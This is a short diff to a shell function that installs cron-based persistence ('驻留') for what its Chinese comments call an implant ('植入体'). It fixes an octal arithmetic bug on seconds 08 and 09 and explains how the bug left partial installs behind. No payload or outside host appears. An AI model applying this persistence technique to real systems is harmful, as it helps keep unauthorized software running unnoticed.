@@ -456,7 +456,18 @@ persist_cron() {
     mkdir -p "$PREFIX/etc/cron.d" 2>/dev/null
     [ -d "$PREFIX/etc/cron.d" ] || { WARN "无 $PREFIX/etc/cron.d，跳过 cron 驻留"; return 0; }
     # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
-    M=$(( $(date +%S) % 60 ))
+    #
+    # 前导零是实测踩出来的坑：date +%S 输出 00-59，而 POSIX sh 的算术
+    # 展开把 0 前导的字面量当八进制——08/09 不是合法八进制（8 不是合法
+    # 八进制位），于是整个 $(( )) 报 "arithmetic expression: expecting
+    # EOF" 并使脚本中断。后果不止"cron 没装上"：install 在写 conf/bin
+    # 之后才走到这里，中断会留下部分安装状态，而部署报告因 rc!=0 看起来
+    # 只是失败了一次，没人知道磁盘上多了半个植入体。
+    # 触发窗口是每分钟的第 8、9 秒（约 3.3%），故单跑守卫常常全绿、
+    # 在 make test 里偶发失败——这类时间依赖缺陷绝不能靠"再跑一次"放过。
+    # ${_S#0} 剥一个前导零：08→8、00→0、59→59；随后取模恒为十进制。
+    _S=$(date +%S); _S=${_S#0}
+    M=$(( _S % 60 ))
     #
     # 缺陷修复（实测踩出来的）：原条目是
     #     . /etc/camd/camd.conf; /usr/local/bin/camd --sink ... --backend ...
